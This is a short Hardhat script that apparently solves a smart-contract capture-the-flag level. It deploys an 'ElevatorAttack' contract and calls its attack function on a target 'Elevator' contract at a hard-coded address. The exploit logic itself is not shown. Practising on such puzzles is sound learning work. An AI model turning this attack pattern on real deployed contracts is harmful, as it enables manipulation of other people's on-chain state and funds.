import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Elevator", CONTRACT_ADDRESS, signer);

    const attackerFactory = await ethers.getContractFactory("ElevatorAttack");
    const attackerContract = await attackerFactory.deploy();

    await attackerContract.attack(CONTRACT_ADDRESS);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
